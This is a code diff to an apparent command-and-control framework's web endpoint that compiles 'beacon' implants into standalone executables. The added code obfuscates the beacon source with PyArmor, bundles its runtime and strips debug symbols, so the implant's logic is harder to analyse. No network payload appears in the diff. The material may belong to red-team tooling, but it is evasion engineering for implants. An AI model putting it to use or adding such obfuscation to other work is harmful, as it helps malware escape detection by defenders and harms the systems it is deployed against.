@@ -123,6 +123,30 @@ def compile_beacon(req: CompileRequest, _: User = Depends(require_auth)):
         with open(src, "w") as f:
             f.write(req.code)
 
+        # PyArmor: encrypts Python bytecode with a runtime key (strongest Python obfuscation)
+        pyarmor_bin = shutil.which("pyarmor")
+        if pyarmor_bin:
+            try:
+                armor_out = os.path.join(tmpdir, "armored")
+                pa = subprocess.run(
+                    [pyarmor_bin, "gen", "--output", armor_out, src],
+                    capture_output=True, text=True, timeout=60, cwd=tmpdir
+                )
+                if pa.returncode == 0:
+                    armored_py = os.path.join(armor_out, "beacon.py")
+                    if os.path.exists(armored_py):
+                        # Copy runtime package alongside the obfuscated source
+                        for item in os.listdir(armor_out):
+                            item_path = os.path.join(armor_out, item)
+                            dest = os.path.join(tmpdir, item)
+                            if os.path.isdir(item_path):
+                                shutil.copytree(item_path, dest, dirs_exist_ok=True)
+                            else:
+                                shutil.copy2(item_path, dest)
+                        src = os.path.join(tmpdir, "beacon.py")
+            except Exception:
+                pass  # PyArmor failed — use plain source
+
         cmd = [
             pyinstaller,
             "--onefile",
@@ -131,6 +155,7 @@ def compile_beacon(req: CompileRequest, _: User = Depends(require_auth)):
             "--workpath", os.path.join(tmpdir, "build"),
             "--specpath", tmpdir,
             "--log-level", "ERROR",
+            "--strip",          # strip debug symbols from ELF (Linux)
         ]
 
         if req.platform == "windows":
@@ -142,6 +167,11 @@ def compile_beacon(req: CompileRequest, _: User = Depends(require_auth)):
                     status_code=503,
                     detail="Windows cross-compilation requires Wine on the server. Download the .py and compile on Windows with: pyinstaller --onefile beacon.py"
                 )
+
+        # Bundle PyArmor runtime directories if present
+        for item in os.listdir(tmpdir):
+            if item.startswith("pyarmor_runtime"):
+                cmd += ["--add-data", f"{os.path.join(tmpdir, item)}{os.pathsep}{item}"]
 
         cmd.append(src)
 
